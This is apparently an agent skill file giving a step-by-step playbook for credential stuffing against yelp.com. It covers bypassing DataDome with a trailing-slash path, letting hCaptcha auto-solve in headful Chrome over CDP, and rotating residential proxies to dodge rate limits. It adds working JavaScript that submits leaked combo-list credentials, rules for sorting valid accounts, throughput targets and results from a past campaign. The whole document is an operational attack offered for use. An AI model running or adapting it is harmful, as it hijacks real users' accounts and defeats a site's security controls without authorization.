---
name: yelp-auth-perimeter
description: Fastest known method to exercise Yelp's login perimeter — DataDome path-normalization bypass, invisible hCaptcha auto-solve in headful Chrome/CDP, and credential validation at scale (~5.5 s/credential, zero captcha cost). Use for credential-stuffing PoCs, combo-list validation, and auth-flow recon against yelp.com.
---

# Yelp auth perimeter — fast path

Everything here is measured on production `www.yelp.com`, 2026-11. Follow it in order; do not improvise
variants that this file already marks as slower or broken.

## 0. Facts that drive the whole design

| Fact | Evidence |
|---|---|
| DataDome rule matches the **literal path** `/login`, not the route | `GET /login` = 403 in 1000/1000; `GET /login/` = 200 in 1000/1000, from the same IP |
| `/signup` is outside DataDome entirely | `/login` 403 and `/signup` 200 from one IP |
| hCaptcha on login is invisible and **auto-solves** in headful Chrome over CDP | 113/113 submissions validated, 0 challenge dialogs, 0 solver cost |
| `/login/newajax` returns JSON and had **no** app rate limit | 41 POST from one IP → 0×429. `/login` (classic) limits at ~15/IP |
| Session is issued on success and `/profile` returns 200 before email verification | `zss` cookie + `/profile` 200 |

So: bypass DataDome with a trailing slash, submit to `/login/newajax`, let the widget mint its own token.

## 1. Hard rules

1. Never target `GET /login` — always `/login/` (or `/login;`, `/login/%2e`). `/login/.` is a 404.
2. Do **not** use a captcha solver. Capsolver no longer supports hCaptcha; the invisible widget solves itself.
3. Do **not** use `Fetch.*` interception to read responses — the success response is followed by a redirect and
   `Fetch.getResponseBody` loses the body. Use `Network.loadingFinished` → `Network.getResponseBody`.
4. Do **not** select `input[name=password]` globally — the page carries three elements with `id=password`
   in different forms. Scope everything to `#ajax-login`.
5. Do **not** read the alert from the DOM. React keeps the previous alert; DOM readings produce phantom results
   (this cost 5 false "5/5" runs). Classify only from the captured JSON body.
6. Do **not** reload between failed attempts. Reuse the hydrated page: 1.6 s vs 5.5 s per credential.
7. Max **3** Chrome instances on a 4-vCPU box. More starves hydration and yields 40 % `NO_POST`.
8. Re-check every `NO_POST`. Never let it absorb a real hit.

## 2. Proxy discipline (dominant cost factor)

Residential/mobile proxy only. Datacenter IPs get challenged on `/signup` and never hydrate.

| Rule | Value |
|---|---|
| Chunk size per sticky session | **8 credentials** |
| Sessions per proxy account before rotating | 1 chunk, then next account |
| Hard stop for a session | 3 consecutive `ddok=false` |
| Sticky window | `sesstime-1800` for a full chunk; new random `sessid` per chunk |
| Cleanup pass | 1 credential per ~2 s of budget, own fresh session |

Degradation is monotonic: a session starts clean and turns dirty after roughly 8–40 submissions. Symptoms in
order: 403 interstitial → page renders under 400 kB → form missing → `fire()` returns 0 → `NO_POST`.
When the second symptom appears, kill the browser and open a new session. Do not debug it.

`ddok=false` (no `Log In` title, `outerHTML` < 200 kB after 50 s) means the IP is already burned — re-session
immediately, and count it as a proxy failure, not a credential result.

## 3. Hydration gate (must pass before any submit)

```
Page.navigate https://www.yelp.com/login/
poll every 1.2 s, up to 20 s:
  document.getElementById('ajax-login')  exists
  AND document.documentElement.outerHTML.length > 400000
```

A hydrated login page is 1.0–1.3 MB. 200–260 kB is the pre-hydration shell and produces no POST. Retry the
navigation up to 4 times; a chunk that cannot hydrate in 4 rounds is a proxy failure.

## 4. Submit sequence (exact)

```js
var f = document.getElementById('ajax-login');
if (!f) return 0;
var p = f.querySelector('input[name=password]');
if (!p || f.offsetParent === null) {
  document.querySelector('.login-with-password-link').click();   // page defaults to email-only / magic link
  await sleep(800);
}
f = document.getElementById('ajax-login');
var e = f.querySelector('input[name=email]');
p = f.querySelector('input[name=password]');
if (!e || !p) return 0;
var setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set;
e.focus(); setter.call(e, email); e.dispatchEvent(new Event('input',  {bubbles:true}));
e.dispatchEvent(new Event('change', {bubbles:true}));
p.focus(); setter.call(p, pass);  p.dispatchEvent(new Event('input',  {bubbles:true}));
p.dispatchEvent(new Event('change', {bubbles:true}));
await sleep(180);
f.querySelector('button[type=submit]').click();
```

The native setter plus `input`/`change` events are required — React ignores direct `el.value` assignment and
silently submits an empty password (which comes back as a magic-link response).

## 5. Result classification (ordered, from the JSON body only)

| Priority | Body | Meaning | Action |
|---|---|---|---|
| 1 | `"success": true` | valid credential, session issued | verify, then logout |
| 2 | `"incorrect"` + `error_fields: ["email","password"]` | server compared the password | verified bad |
| 3 | `"This account has been closed."` | email exists, account closed | verified, not usable |
| 4 | `"We're unable to log you in right now."` | captcha/risk fail-closed — **not** a credential verdict | retry |
| 5 | status 403 / `geo.captcha-delivery.com` | DataDome | retry, rotate session |
| 6 | status 429 | app limiter | wait 10 s, retry |
| 7 | anything else / empty body | unknown | retry, then queue for re-check |

Success handling: confirm `zss` in `Network.getAllCookies` and `GET /profile` = 200, record the credential,
then `Page.navigate https://www.yelp.com/logout?return_url=%2Flogin%2F` and re-hydrate (up to 3 rounds, then 4 more).

## 6. Throughput targets

| Stage | Healthy rate |
|---|---|
| HEAD bypass probe | ~90 req/s |
| Browser, single credential | 5.5 s (p50), 9 s with retry |
| 100 credentials, chunk 8, one browser | ~10–12 min |
| 100 credentials, 3 browsers | ~6–8 min |

Failure budget on a clean account: `<2 %` `NO_POST`, `<3 %` 403, `0 %` 429. Above 10 % `NO_POST` the sessions
are dirty — rotate instead of retrying harder.

## 7. Run order

1. `runner/check-proxy.ps1` — each account must return `login=200` on a fresh session.
2. `runner/make-chunks.ps1 -Source combo.txt -Skip 0 -Take 100 -Size 8`.
3. For each chunk: `PU_BASE / PW / BID / LIST / OUT` env → `node runner/batch.js`, alternating accounts.
4. Any chunk with `<6` attempts for a full-size chunk → rerun it, new session, different account.
5. `runner/classify.ps1` over the JSONL. Feed `403 / 429 / NO_POST / other` back through step 3.
6. Only then report. Verified = categories 1–3.

## 8. Reporting format that survives review

Report per category, never a single "success rate": validated-wrong, valid, closed, unable, 403, 429,
unresolved. State the coverage (`processed / total`). Distinguish `"unable"` (control exercised, no verdict)
from a real negative. Quote one raw JSON body per category.

## 9. Pitfall index (each of these cost a run)

- Global password selector → submits the magic-link form, 0 POST, 75 s wasted per credential.
- `Fetch` capture → empty bodies on exactly the successes, the rows that matter most.
- DOM alert reads → stale alert from the previous credential, false positives.
- 15-min timecap hit mid-list → always resume by offset, never restart at 0.
- Same sticky session for 100 credentials → 40 % `NO_POST` and 2.5 % 403.
- Password `#`, `.`, `~` passed through a shell → use a file plus `-Encoding ascii`, and JSON-encode into JS.

## 10. Reference numbers from the source campaign

400 credentials: 333 validated-wrong, 22 closed, 1 valid, 26 unresolved, 0 captcha spend, 0 solver.
Best sustained rate 5.4 s/credential. Blind success rate on a used combo list ~0.25 %.

## Files

- `runner/batch.js` — relay + headful Chrome + CDP, chunk runner, writes JSONL evidence.
- `runner/check-proxy.ps1` — proxy health gate.
- `runner/make-chunks.ps1` — slice a combo list into session-sized chunks.
- `runner/classify.ps1` — aggregate JSONL into category counts and a re-check queue.
- `reference/RESPONSE-MATRIX.md` — verbatim response bodies and headers.
- `reference/PITFALLS.md` — expanded failure catalogue with symptoms.
